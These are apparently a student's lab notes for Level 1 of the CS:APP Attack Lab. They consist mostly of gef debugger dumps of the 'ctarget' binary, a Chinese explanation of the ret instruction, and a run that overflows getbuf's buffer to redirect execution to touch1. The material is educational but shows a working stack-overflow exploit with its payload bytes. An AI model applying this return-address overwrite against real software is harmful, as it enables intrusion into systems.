~~~shell
gef➤  disas getbuf 
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    rsp,0x28
   0x00000000004017ac <+4>:     mov    rdi,rsp
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    eax,0x1
   0x00000000004017b9 <+17>:    add    rsp,0x28
   0x00000000004017bd <+21>:    ret    
End of assembler dump.
~~~

~~~shell
gef➤  b touch1
Breakpoint 3 at 0x4017c0: file visible.c, line 25.
gef➤  disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    rsp,0x8
   0x00000000004017c4 <+4>:     mov    DWORD PTR [rip+0x202d0e],0x1        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    edi,0x4030c5
   0x00000000004017d3 <+19>:    call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    edi,0x1
   0x00000000004017dd <+29>:    call   0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    edi,0x0
   0x00000000004017e7 <+39>:    call   0x400e40 <exit@plt>
End of assembler dump.
~~~

~~~shell
rasm2 -a x86 -b 32 "nop; jmp esp"
90ffe4
~~~

~~~shell
$rcx   : 0x94              
$rdx   : 0x000000006066e3  →  0x0000000000000000
$rsp   : 0x0000005561dc78  →  "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017b4  →  <getbuf+12> mov eax, 0x1
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dc78│+0x0000: "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"   ← $rax, $rsp
0x0000005561dc80│+0x0008: "ADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"
0x0000005561dc88│+0x0010: "AAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQA"
0x0000005561dc90│+0x0018: "IAAJAAKAALAAMAANAAOAAPAAQA"
0x0000005561dc98│+0x0020: "ALAAMAANAAOAAPAAQA"
0x0000005561dca0│+0x0028: "AAOAAPAAQA"
0x0000005561dca8│+0x0030: 0x00000000004151 ("QA"?)
0x0000005561dcb0│+0x0038: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017a8 <getbuf+0>       sub    rsp, 0x28
     0x4017ac <getbuf+4>       mov    rdi, rsp
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●→   0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
     0x4017bd <getbuf+21>      ret    
     0x4017be                  nop    
     0x4017bf                  nop    
     0x4017c0 <touch1+0>       sub    rsp, 0x8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017b4 in getbuf (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017b4 → getbuf()
~~~

~~~shell
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x94              
$rdx   : 0x000000006066e3  →  0x0000000000000000
$rsp   : 0x0000005561dca0  →  "AAOAAPAAQA"
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017bd  →  <getbuf+21> ret 
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dca0│+0x0000: "AAOAAPAAQA"   ← $rsp
0x0000005561dca8│+0x0008: 0x00000000004151 ("QA"?)
0x0000005561dcb0│+0x0010: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
0x0000005561dcb8│+0x0018: 0x0000000000000000
0x0000005561dcc0│+0x0020: 0xf4f4f4f4f4f4f4f4
0x0000005561dcc8│+0x0028: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd0│+0x0030: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd8│+0x0038: 0xf4f4f4f4f4f4f4f4
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●    0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
 →   0x4017bd <getbuf+21>      ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017bd in getbuf (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017bd → getbuf()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
~~~



`ret` 指令是汇编语言中的一条指令，其全称为 "return"，在函数调用完成后用于从函数返回。它的具体作用可以分解为以下几个步骤：

1. **弹出返回地址**：`ret` 指令首先从调用函数时使用的栈中弹出返回地址。返回地址是函数被调用时压入栈的地址，指向调用函数后应当执行的下一条指令。
2. **跳转到返回地址**：`ret` 指令接着使程序的执行跳转到弹出的返回地址。这意味着程序的控制权从当前函数转移回了调用它的函数。
3. **栈指针调整**：执行 `ret` 指令后，栈指针（通常是 ESP 寄存器）会自动增加，以指向栈中下一个元素。这是因为返回地址已经从栈中弹出。

### 在函数调用中的作用

当一个函数被调用时，通常发生以下几个步骤：
- 调用指令（如 `call`）将返回地址（即 `call` 指令后的下一条指令地址）压入栈中。
- 然后程序跳转到被调用函数的起始位置执行。
- 在被调用函数执行完毕后，`ret` 指令负责从栈中弹出返回地址，并将程序的执行流程跳转回到这个地址。

### 在攻击中的作用

在某些类型的安全攻击中，比如缓冲区溢出攻击，攻击者可能会尝试操纵栈上的返回地址。如果攻击者能够控制栈上的数据，他们可以通过向栈中注入一个不同的地址，并在执行 `ret` 指令时强制程序跳转到一个非预期的、恶意的位置，这就实现了对程序流程的控制。这是为什么理解 `ret` 指令在安全领域非常重要的原因之一。

# 正常调用
~~~shell

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000005561dc78  →  "hello world!"
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x22              
$rdx   : 0x000000006066bd  →  0x0000000000000000
$rsp   : 0x0000005561dc78  →  "hello world!"
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017b4  →  <getbuf+12> mov eax, 0x1
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dc78│+0x0000: "hello world!"         ← $rax, $rsp
0x0000005561dc80│+0x0008: 0x00000021646c72 ("rld!"?)
0x0000005561dc88│+0x0010: 0x0000000000000000
0x0000005561dc90│+0x0018: 0x0000000000000000
0x0000005561dc98│+0x0020: 0x00000055586000  →  0x0000000000000000
0x0000005561dca0│+0x0028: 0x00000000401976  →  <test+14> mov edx, eax
0x0000005561dca8│+0x0030: 0x00000000000009 ("\t"?)
0x0000005561dcb0│+0x0038: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017a8 <getbuf+0>       sub    rsp, 0x28
     0x4017ac <getbuf+4>       mov    rdi, rsp
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●→   0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
     0x4017bd <getbuf+21>      ret    
     0x4017be                  nop    
     0x4017bf                  nop    
     0x4017c0 <touch1+0>       sub    rsp, 0x8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017b4 in getbuf (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017b4 → getbuf()
[#1] 0x401976 → test()
[#2] 0x401f24 → launch(offset=<optimized out>)
[#3] 0x401ffa → stable_launch(offset=<optimized out>)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1               
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x22              
$rdx   : 0x000000006066bd  →  0x0000000000000000
$rsp   : 0x0000005561dca0  →  0x00000000401976  →  <test+14> mov edx, eax
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x31              
$rdi   : 0x007ffff7fa9980  →  0x00000000fbad2288
$rip   : 0x000000004017bd  →  <getbuf+21> ret 
$r8    : 0xa               
$r9    : 0x7c              
$r10   : 0x000000004007af  →  "_IO_getc"
$r11   : 0x246             
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dca0│+0x0000: 0x00000000401976  →  <test+14> mov edx, eax    ← $rsp
0x0000005561dca8│+0x0008: 0x00000000000009 ("\t"?)
0x0000005561dcb0│+0x0010: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
0x0000005561dcb8│+0x0018: 0x0000000000000000
0x0000005561dcc0│+0x0020: 0xf4f4f4f4f4f4f4f4
0x0000005561dcc8│+0x0028: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd0│+0x0030: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd8│+0x0038: 0xf4f4f4f4f4f4f4f4
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017af <getbuf+7>       call   0x401a40 <Gets>
●    0x4017b4 <getbuf+12>      mov    eax, 0x1
     0x4017b9 <getbuf+17>      add    rsp, 0x28
 →   0x4017bd <getbuf+21>      ret    
   ↳    0x401976 <test+14>        mov    edx, eax
        0x401978 <test+16>        mov    esi, 0x403188
        0x40197d <test+21>        mov    edi, 0x1
        0x401982 <test+26>        mov    eax, 0x0
        0x401987 <test+31>        call   0x400df0 <__printf_chk@plt>
        0x40198c <test+36>        add    rsp, 0x8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x4017bd in getbuf (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017bd → getbuf()
[#1] 0x401976 → test()
[#2] 0x401f24 → launch(offset=<optimized out>)
[#3] 0x401ffa → stable_launch(offset=<optimized out>)

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000055586000  →  0x0000000000000000
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x0000005561dca8  →  0x00000000000009 ("\t"?)
$rbp   : 0x00000055685fe8  →  0x00000000402fa5  →  0x3a6968003a697168 ("hqi:"?)
$rsi   : 0x7274732065707954 ("Type str"?)
$rdi   : 0x007ffff7fab7e0  →  0x0000000000000000
$rip   : 0x00000000401971  →  <test+9> call 0x4017a8 <getbuf>
$r8    : 0x0               
$r9    : 0xc               
$r10   : 0x00000000400704  →  0x5f007465736d656d ("memset"?)
$r11   : 0x007ffff7f48d90  →  <__memset_avx2_unaligned_erms+0> endbr64 
$r12   : 0x2               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x0000005561dca8│+0x0000: 0x00000000000009 ("\t"?)       ← $rsp
0x0000005561dcb0│+0x0008: 0x00000000401f24  →  <launch+112> cmp DWORD PTR [rip+0x2025bd], 0x0        # 0x6044e8 <is_checker>
0x0000005561dcb8│+0x0010: 0x0000000000000000
0x0000005561dcc0│+0x0018: 0xf4f4f4f4f4f4f4f4
0x0000005561dcc8│+0x0020: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd0│+0x0028: 0xf4f4f4f4f4f4f4f4
0x0000005561dcd8│+0x0030: 0xf4f4f4f4f4f4f4f4
0x0000005561dce0│+0x0038: 0xf4f4f4f4f4f4f4f4
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401963 <touch3+105>     call   0x400e40 <exit@plt>
     0x401968 <test+0>         sub    rsp, 0x8
     0x40196c <test+4>         mov    eax, 0x0
●→   0x401971 <test+9>         call   0x4017a8 <getbuf>
   ↳    0x4017a8 <getbuf+0>       sub    rsp, 0x28
        0x4017ac <getbuf+4>       mov    rdi, rsp
        0x4017af <getbuf+7>       call   0x401a40 <Gets>
        0x4017b4 <getbuf+12>      mov    eax, 0x1
        0x4017b9 <getbuf+17>      add    rsp, 0x28
        0x4017bd <getbuf+21>      ret    
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments ────
getbuf (<void>)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ctarget", stopped 0x401971 in test (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401971 → test()
[#1] 0x401f24 → launch(offset=<optimized out>)
[#2] 0x401ffa → stable_launch(offset=<optimized out>)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

gef➤  x /4w 0x401971
0x401971 <test+9>:      0xfffe32e8      0xbec289ff      0x403188        0x1bf
gef➤  disas test 
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    rsp,0x8
   0x000000000040196c <+4>:     mov    eax,0x0
=> 0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    edx,eax
   0x0000000000401978 <+16>:    mov    esi,0x403188
   0x000000000040197d <+21>:    mov    edi,0x1
   0x0000000000401982 <+26>:    mov    eax,0x0
   0x0000000000401987 <+31>:    call   0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    rsp,0x8
   0x0000000000401990 <+40>:    ret    
End of assembler dump.

0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
~~~

# Level1
~~~shell
~/new_space/CSAPP_Lab/Attack/target1 (master*) » cat exploit.txt | ./hex2raw | ./ctarget -q         czy@czy-307-thinkcentre-m720q-n000
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:41 41 41 42 41 41 43 41 41 44 41 41 45 41 41 46 41 41 47 41 41 48 41 41 49 41 41 4A 41 41 4B 41 41 4C 41 41 4D 41 41 4E C0 17 40 00
~~~

